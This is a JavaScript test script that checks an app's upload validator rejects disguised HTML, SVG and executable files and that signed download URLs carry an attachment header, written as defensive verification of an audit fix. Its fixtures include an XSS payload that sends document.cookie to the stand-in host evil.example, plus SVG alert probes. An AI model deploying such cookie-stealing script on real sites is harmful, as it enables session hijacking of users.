/**
 * 16-upload-safety.mjs — proves the app-layer audit's M1 fix in BOTH
 * directions, which the audit itself could only do for the serving half.
 *
 * The audit proved, live, that a Supabase signed URL serves an object with its
 * stored content type and NO Content-Disposition — so anything a browser
 * renders, renders. What it could NOT prove without writing to production was
 * the upload half: that a disguised HTML file actually gets rejected.
 * This script closes that loop.
 *
 * Two halves, both required to pass:
 *   A. detectFileType() — the real server-side decision function, exercised
 *      directly against crafted files: a disguised HTML/SVG/script payload
 *      must be REJECTED, and a genuine PDF/PNG/JPEG/docx/csv ACCEPTED. This is
 *      the half that could never be tested live without planting a real
 *      malicious object in the production bucket.
 *   B. Round-trip against the LIVE bucket with the service role: upload a real
 *      PDF the way the action now does (server-decided content type), mint a
 *      signed URL the way the app now does (`{ download }`), fetch it, and
 *      assert the response carries `Content-Disposition: attachment` and the
 *      server's content type — then clean the object up. This is the exact
 *      assertion the audit made and FAILED before the fix.
 *
 * detectFileType() lives in a .ts module and this project has no ts-node/tsx
 * (same constraint 15-rate-limiting.mjs documented for lib/rate-limit.ts), so
 * half A re-implements nothing — it shells out to `npx tsc` once to compile
 * the single module to a temp .mjs and imports the real thing. If the compile
 * step is unavailable the script FAILS rather than silently skipping, so a
 * green run always means the real function was exercised.
 */

import { readFileSync, writeFileSync, mkdirSync, rmSync, existsSync } from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { execSync } from 'node:child_process';
import { adminClient } from './lib/admin.mjs';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const ROOT = path.resolve(__dirname, '../..');
const TMP = path.join(__dirname, '.data', 'upload-safety');

let pass = 0;
let fail = 0;
const failures = [];

function check(name, condition, detail = '') {
  if (condition) {
    pass++;
    console.log(`  ✓ ${name}`);
  } else {
    fail++;
    failures.push(`${name}${detail ? ` — ${detail}` : ''}`);
    console.log(`  ✗ ${name}${detail ? ` — ${detail}` : ''}`);
  }
}

// --- compile the real detectFileType() ------------------------------------

function loadDetector() {
  mkdirSync(TMP, { recursive: true });
  const src = path.join(ROOT, 'src/lib/documents/file-types.ts');
  execSync(
    `npx tsc "${src}" --outDir "${TMP}" --module esnext --target es2022 --moduleResolution bundler --skipLibCheck`,
    { cwd: ROOT, stdio: 'pipe' }
  );
  const out = path.join(TMP, 'file-types.js');
  if (!existsSync(out)) throw new Error('tsc produced no output');
  const mjs = path.join(TMP, 'file-types.mjs');
  writeFileSync(mjs, readFileSync(out, 'utf8'));
  return import('file://' + mjs.replace(/\\/g, '/'));
}

// --- fixtures --------------------------------------------------------------

/** Smallest structurally-valid PDF; real %PDF signature. */
const REAL_PDF = Buffer.from(
  '%PDF-1.4\n1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj\n' +
    '2 0 obj<</Type/Pages/Kids[]/Count 0>>endobj\ntrailer<</Root 1 0 R>>\n%%EOF\n',
  'latin1'
);
const REAL_PNG = Buffer.concat([
  Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]),
  Buffer.alloc(64, 0x11),
]);
const REAL_JPEG = Buffer.concat([Buffer.from([0xff, 0xd8, 0xff, 0xe0]), Buffer.alloc(64, 0x22)]);
const REAL_ZIP_OFFICE = Buffer.concat([
  Buffer.from([0x50, 0x4b, 0x03, 0x04]),
  Buffer.alloc(64, 0x33),
]);
const REAL_CSV = Buffer.from('name,pan,gstin\nAcme Ltd,ABCDE1234F,27ABCDE1234F1Z5\n', 'utf8');
const REAL_CSV_BOM = Buffer.concat([Buffer.from([0xef, 0xbb, 0xbf]), REAL_CSV]);

const HTML_PAYLOAD = Buffer.from(
  '<html><body><script>fetch("https://evil.example/"+document.cookie)</script></body></html>',
  'utf8'
);
const SVG_PAYLOAD = Buffer.from(
  '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"><script>alert(1)</script></svg>',
  'utf8'
);

/**
 * A File whose name/type LIE — exactly the shape the audit described:
 * the browser's multipart part is attacker-controlled, so both the extension
 * and the declared MIME are set to something benign while the bytes are not.
 */
function fakeFile(bytes, name, declaredType) {
  return new File([bytes], name, { type: declaredType });
}

async function main() {
  console.log('\n16-upload-safety — proving the M1 fix in both directions\n');

  console.log('A. detectFileType() — the real server-side decision function');
  let mod;
  try {
    mod = await loadDetector();
  } catch (err) {
    console.error('\nFATAL: could not compile src/lib/documents/file-types.ts —', err.message);
    console.error('Refusing to pass by skipping. Fix the compile step and re-run.\n');
    process.exit(1);
  }
  const { detectFileType } = mod;

  // --- the attack the whole finding is about -------------------------------
  const disguisedHtml = await detectFileType(fakeFile(HTML_PAYLOAD, 'invoice.pdf', 'application/pdf'));
  check(
    'A1  HTML bytes named "invoice.pdf" and declared application/pdf → REJECTED',
    disguisedHtml.ok === false,
    disguisedHtml.ok ? `accepted as ${disguisedHtml.type.contentType}` : ''
  );

  const htmlAsHtml = await detectFileType(fakeFile(HTML_PAYLOAD, 'page.html', 'text/html'));
  check('A2  honest .html / text/html → REJECTED (not on the allow-list)', htmlAsHtml.ok === false);

  const svgAsSvg = await detectFileType(fakeFile(SVG_PAYLOAD, 'logo.svg', 'image/svg+xml'));
  check('A3  honest .svg / image/svg+xml → REJECTED (not on the allow-list)', svgAsSvg.ok === false);

  const svgAsPng = await detectFileType(fakeFile(SVG_PAYLOAD, 'logo.png', 'image/png'));
  check('A4  SVG bytes named "logo.png" declared image/png → REJECTED', svgAsPng.ok === false);

  // The specific bypass the text branch has to stop: no magic bytes exist for
  // CSV, so without isPlausibleText() an HTML payload named .csv would sail in.
  const htmlAsCsv = await detectFileType(fakeFile(HTML_PAYLOAD, 'data.csv', 'text/csv'));
  check('A5  HTML bytes named "data.csv" → REJECTED (leading "<" blocked)', htmlAsCsv.ok === false);

  const svgAsTxt = await detectFileType(fakeFile(SVG_PAYLOAD, 'notes.txt', 'text/plain'));
  check('A6  SVG bytes named "notes.txt" → REJECTED (leading "<" blocked)', svgAsTxt.ok === false);

  const exeAsPdf = await detectFileType(
    fakeFile(Buffer.from([0x4d, 0x5a, 0x90, 0x00, 0x03]), 'setup.pdf', 'application/pdf')
  );
  check('A7  Windows PE (MZ) bytes named "setup.pdf" → REJECTED', exeAsPdf.ok === false);

  const noExt = await detectFileType(fakeFile(REAL_PDF, 'invoice', 'application/pdf'));
  check('A8  no extension at all → REJECTED (fails closed)', noExt.ok === false);

  // --- the legitimate paths must still work (no-regression half) -----------
  const pdf = await detectFileType(fakeFile(REAL_PDF, 'Form16.PDF', 'application/octet-stream'));
  check(
    'A9  real PDF (uppercase ext, wrong declared MIME) → ACCEPTED as application/pdf',
    pdf.ok === true && pdf.type.contentType === 'application/pdf' && pdf.type.ext === 'pdf',
    pdf.ok ? `got ${pdf.type.contentType}` : pdf.error
  );

  const png = await detectFileType(fakeFile(REAL_PNG, 'scan.png', 'image/png'));
  check('A10 real PNG → ACCEPTED as image/png', png.ok === true && png.type.contentType === 'image/png');

  const jpeg = await detectFileType(fakeFile(REAL_JPEG, 'scan.jpeg', 'image/jpeg'));
  check(
    'A11 real JPEG via .jpeg alias → ACCEPTED as image/jpeg, canonical ext "jpg"',
    jpeg.ok === true && jpeg.type.contentType === 'image/jpeg' && jpeg.type.ext === 'jpg'
  );

  const xlsx = await detectFileType(fakeFile(REAL_ZIP_OFFICE, 'ledger.xlsx', 'application/zip'));
  check(
    'A12 real ZIP container named .xlsx → ACCEPTED as the xlsx content type',
    xlsx.ok === true && xlsx.type.ext === 'xlsx'
  );

  const csv = await detectFileType(fakeFile(REAL_CSV, 'clients.csv', 'text/csv'));
  check('A13 real CSV → ACCEPTED as text/csv', csv.ok === true && csv.type.contentType === 'text/csv');

  const csvBom = await detectFileType(fakeFile(REAL_CSV_BOM, 'clients.csv', 'text/csv'));
  check('A14 real CSV with Excel UTF-8 BOM → ACCEPTED (BOM skipped, not treated as binary)', csvBom.ok === true);

  const binAsCsv = await detectFileType(
    fakeFile(Buffer.from([0x00, 0x01, 0x02, 0x00]), 'data.csv', 'text/csv')
  );
  check('A15 NUL-containing binary named "data.csv" → REJECTED', binAsCsv.ok === false);

  // --- B. live round-trip: attachment disposition ---------------------------
  console.log('\nB. Live round-trip against the real bucket (service role)');
  const admin = adminClient();
  const objectPath = `upload-safety-probe/${crypto.randomUUID()}/${crypto.randomUUID()}.pdf`;
  let uploaded = false;

  try {
    const { error: upErr } = await admin.storage
      .from('client-documents')
      .upload(objectPath, REAL_PDF, { contentType: 'application/pdf' });
    check('B1  a real PDF uploads successfully (no regression on the happy path)', !upErr, upErr?.message);
    uploaded = !upErr;

    if (uploaded) {
      // Exactly what createDocumentDownloadUrl() now does.
      const { data: signed, error: signErr } = await admin.storage
        .from('client-documents')
        .createSignedUrl(objectPath, 300, { download: 'Form 16 - FY2025-26.pdf' });
      check('B2  signed URL mints successfully', !signErr && !!signed?.signedUrl, signErr?.message);

      if (signed?.signedUrl) {
        const res = await fetch(signed.signedUrl);
        const disposition = res.headers.get('content-disposition') || '';
        const ctype = res.headers.get('content-type') || '';

        check('B3  download responds 200', res.status === 200, `status ${res.status}`);
        check(
          'B4  Content-Disposition is attachment — THE FIX (audit found this header absent entirely)',
          /^attachment/i.test(disposition),
          `got: ${disposition || '(no header)'}`
        );
        check(
          'B5  Content-Type is the server-decided application/pdf',
          ctype.includes('application/pdf'),
          `got: ${ctype}`
        );

        // The negative control: prove B4 is actually measuring the option and
        // not something Supabase would have done anyway. Without `download`,
        // the header must still be absent — i.e. the pre-fix behaviour the
        // audit documented is real and this fix is what changes it.
        const { data: bare } = await admin.storage
          .from('client-documents')
          .createSignedUrl(objectPath, 300);
        const bareRes = await fetch(bare.signedUrl);
        const bareDisp = bareRes.headers.get('content-disposition');
        check(
          'B6  NEGATIVE CONTROL: same object without { download } serves NO Content-Disposition',
          !bareDisp,
          `got: ${bareDisp} — if this is set, B4 proves nothing`
        );
      }
    }
  } finally {
    if (uploaded) {
      await admin.storage.from('client-documents').remove([objectPath]);
      const { data: after } = await admin.storage
        .from('client-documents')
        .list(path.posix.dirname(objectPath));
      check('B7  probe object cleaned up (nothing left behind in the bucket)', (after ?? []).length === 0);
    }
    rmSync(TMP, { recursive: true, force: true });
  }

  console.log(`\n${pass}/${pass + fail} checks passed`);
  if (fail) {
    console.log('\nFAILURES:');
    for (const f of failures) console.log(`  - ${f}`);
    process.exit(1);
  }
  console.log('Upload type validation and attachment disposition both proven.\n');
}

main().catch((err) => {
  console.error('\nFATAL:', err);
  process.exit(1);
});
